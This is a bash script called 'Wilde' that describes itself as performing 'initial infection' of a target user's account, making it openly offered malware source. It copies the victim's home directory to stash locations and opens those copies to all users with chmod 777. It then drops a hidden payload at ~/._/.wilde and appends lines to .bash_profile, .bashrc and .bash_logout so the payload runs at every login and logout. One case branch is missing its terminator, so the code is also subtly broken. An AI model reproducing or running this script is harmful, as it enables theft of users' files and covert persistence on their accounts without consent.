#!/bin/bash
# Wilde

St(){
	# Self test:
	# Simply checks if wilde can write something to the target
	# In the future this will actually do something
	touch /home/$tl/.st
	if [[ -e /home/$tl/.st ]]; then
		rm -f /home/$tl/.st
		exit 0
	else
		exit 99
	fi
}

Dt(){
	# Initial infection
	if [[ ! -e /home/$tl/._ ]]; then
		mkdir /home/$tl/._
	fi
	gop 1		# Dump their home contents to a stash
	gop 2		# Open their permissions to all
	gop 5
	if [[ $(cat /home/$tl/.bash_profile | grep ~/._/.wilde) ]]; then
		echo "WILDE: $tl already primed"
	else
		gop 4
	fi
	exit 0
}

gop(){
	for i in $pl; do
		case $1 in
			1) cp -arf /home/$tl/ "$i/$tl";;
			2) chmod -Rf 777 "$i";;
			3) rm -rf "/home/$tl/._";;
			4) echo "chmod +x ~/._/.wilde &>/dev/null" >> /home/$tl/.bash_profile
				echo "chmod +x ~/._/.wilde &>/dev/null" >> /home/$tl/.bashrc
				echo "chmod +x ~/._/.wilde &>/dev/null" >> /home/$tl/.bash_logout
				echo "./._/.wilde &>/dev/null" >> /home/$tl/.bash_profile
				echo "./._/.wilde &>/dev/null" >> /home/$tl/.bashrc
				echo "./._/.wilde &>/dev/null" >> /home/$tl/.bash_logout
				chmod -R 777 /home/$tl/.bash_profile
				chmod -R 777 /home/$tl/.bashrc
				chmod -R 777 /home/$tl/.bash_logout
				chmod +x /home/$tl/._/.wilde
				chown -R $tl /home/$tl/._
				chmod -R 777 /home/$tl/._;;
			5) cat wilde.payload > /home/$tl/._/.wilde
			*) exit 9;;
		esac
	done
}

source $2 

case $1 in
	st) St;;
	dt) Dt;;
	*) echo "Yeah...?";;
esac
